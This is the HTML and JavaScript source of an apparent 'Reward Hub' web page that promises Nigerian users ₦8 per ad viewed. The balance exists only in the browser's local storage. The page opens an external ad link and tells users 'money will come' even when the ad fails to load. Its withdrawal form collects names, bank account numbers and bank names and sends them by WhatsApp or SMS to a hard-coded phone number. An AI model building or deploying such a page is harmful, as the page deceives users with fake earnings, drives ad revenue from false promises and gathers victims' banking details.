<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Reward Hub - Yusuf</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
body{background:#0a1020;color:#fff;min-height:100vh;padding:16px}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.logo{display:flex;align-items:center;gap:10px}
.nbox{width:48px;height:48px;background:linear-gradient(135deg,#3b82f6,#06b6d4);border-radius:14px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:24px}
.live{border:1px solid #06b6d4;color:#06b6d4;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700}
.card{background:#141e36;border-radius:24px;padding:20px;margin-bottom:20px}
.bal{font-size:12px;letter-spacing:2px;color:#94a3b8;margin-bottom:8px}
.amount{font-size:56px;font-weight:900}
.lock{color:#06b6d4;margin:10px 0;font-weight:700}
.timer{border:1px dashed #6b7280;border-radius:16px;padding:12px;font-size:13px;line-height:1.6}
.task{background:#1a2744;border-radius:20px;padding:16px;display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.badge{background:rgba(6,182,212,0.15);color:#06b6d4;padding:4px 10px;border-radius:8px;font-size:12px;font-weight:700;margin-left:8px}
.btn{padding:12px 22px;border-radius:12px;border:none;font-weight:800;cursor:pointer}
.btn-kalli{background:#22c55e;color:#000}
.btn-done{background:#2a3655;color:#6b7a9a}
.withdraw{border:2px solid #facc15;border-radius:24px;padding:20px;background:#141e36}
.withdraw h2{color:#facc15;text-align:center;margin-bottom:16px}
input{width:100%;background:#0a1020;border:1px solid #2a3655;border-radius:14px;padding:16px;color:#fff;margin-bottom:12px;outline:none}
.btn-wa{background:#22c55e;color:#000;width:100%;padding:16px;border-radius:14px;border:none;font-weight:900;margin-bottom:10px;font-size:16px;cursor:pointer}
.btn-sms{background:#f59e0b;color:#000;width:100%;padding:16px;border-radius:14px;border:none;font-weight:900;font-size:16px;cursor:pointer}
.modal{position:fixed;inset:0;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:99}
.modalbox{background:#fff;color:#000;padding:28px;border-radius:20px;text-align:center;max-width:320px;width:90%}
</style>
</head>
<body>

<div class="header">
<div class="logo"><div class="nbox">N</div><b>Reward Hub</b></div>
<div class="live">● LIVE - 12H</div>
</div>

<div class="card">
<div class="bal">💎 YOUR BALANCE</div>
<div class="amount" id="bal">₦0</div>
<div class="lock" id="lockText">Open</div>
<div class="timer" id="timerBox">Will reopen: -<br>Remaining: -</div>
</div>

<div style="margin:16px 0;color:#facc15;font-weight:800">⭐ Today's Tasks ₦8 each</div>

<div id="tasks"></div>

<div class="withdraw">
<h2>Withdraw - How Much</h2>
<input id="suna" placeholder="Your Name">
<input id="acc" placeholder="Account Number">
<input id="bank" placeholder="Bank Name (Opay, Kuda)">
<button class="btn-wa" onclick="withdrawWA()">📱 Send via WhatsApp</button>
<button class="btn-sms" onclick="withdrawSMS()">✉️ Send via SMS (If no WhatsApp)</button>
</div>

<script>
const LINK="https://omg10.com/4/11737348";
const WA_NUMBER="2347070079526";
const SMS_NUMBER="07070079526";
let balance=parseInt(localStorage.getItem('rh_bal')||'0');
let done=JSON.parse(localStorage.getItem('rh_done')||'[false,false,false,false,false]');
let lockUntil=parseInt(localStorage.getItem('rh_lock')||'0');

function render(){
document.getElementById('bal').innerText='₦'+balance;
let now=Date.now();
if(lockUntil>now){
 let diff=lockUntil-now;
 let h=Math.floor(diff/3600000);
 let m=Math.floor((diff%3600000)/60000);
 document.getElementById('lockText').innerText='Locked - 12 hours';
 document.getElementById('timerBox').innerHTML=`⏰ Will reopen: ${new Date(lockUntil).toLocaleString()}<br>⏳ Remaining: ${h}h ${m}m`;
} else {
 document.getElementById('lockText').innerText='Open';
 document.getElementById('timerBox').innerHTML='Ready to do tasks!';
 if(lockUntil!==0){ done=[false,false,false,false,false]; lockUntil=0; localStorage.setItem('rh_done',JSON.stringify(done)); localStorage.setItem('rh_lock','0'); }
}
let html='';
for(let i=0;i<5;i++){
 html+=`<div class="task"><div>Ad ${i+1}<span class="badge">₦8</span></div>${done[i]?'<button class="btn btn-done">Done ✓</button>':`<button class="btn btn-kalli" onclick="doTask(${i})">VIEW</button>`}</div>`;
}
document.getElementById('tasks').innerHTML=html;
}

function doTask(i){
 if(done[i]) return;
 // DIRECT OPEN AD - no iframe
 window.open(LINK,'_blank');
 let sec=8;
 let modal=document.createElement('div');
 modal.className='modal';
 modal.innerHTML=`<div class="modalbox"><h2 id="cnt">Wait ${sec}s...</h2><p style="margin:12px 0">Ad opened in new tab<br><b>No need to buy</b> - view counts as earning<br><br>If you see "Webpage not available" close it and return here, money will come</p></div>`;
 document.body.appendChild(modal);
 let int=setInterval(()=>{
  sec--;
  document.getElementById('cnt').innerText=`Wait ${sec}s...`;
  if(sec<=0){
   clearInterval(int);
   document.body.removeChild(modal);
   if(!done[i]){ balance+=8; done[i]=true; localStorage.setItem('rh_bal',balance); localStorage.setItem('rh_done',JSON.stringify(done)); if(done.every(x=>x)){ lockUntil=Date.now()+12*3600000; localStorage.setItem('rh_lock',lockUntil); } render(); }
  }
 },1000);
}

function withdrawWA(){
 let suna=document.getElementById('suna').value.trim();
 let acc=document.getElementById('acc').value.trim();
 let bank=document.getElementById('bank').value.trim();
 if(!suna||!acc||!bank){ alert('Fill Your Name, Account Number and Bank Name'); return; }
 if(balance<50){ alert('Balance not up to minimum ₦50'); return; }
 let msg=`Hello, I want to withdraw:%0AName: ${suna}%0AAccount: ${acc}%0ABank: ${bank}%0ABalance: ₦${balance}%0ASite: yusuf44-wq.github.io`;
 window.open(`https://wa.me/${WA_NUMBER}?text=${msg}`,'_blank');
}
function withdrawSMS(){
 let suna=document.getElementById('suna').value.trim();
 let acc=document.getElementById('acc').value.trim();
 let bank=document.getElementById('bank').value.trim();
 if(!suna||!acc||!bank){ alert('Fill Your Name, Account Number and Bank Name'); return; }
 if(balance<50){ alert('Balance not up to minimum ₦50'); return; }
 let msg=`Hello, I want to withdraw: Name: ${suna}, Account: ${acc}, Bank: ${bank}, Balance: ₦${balance}, Site: yusuf44-wq.github.io`;
 window.open(`sms:${SMS_NUMBER}?body=${encodeURIComponent(msg)}`,'_blank');
}

render();
</script>
</body>
</html>
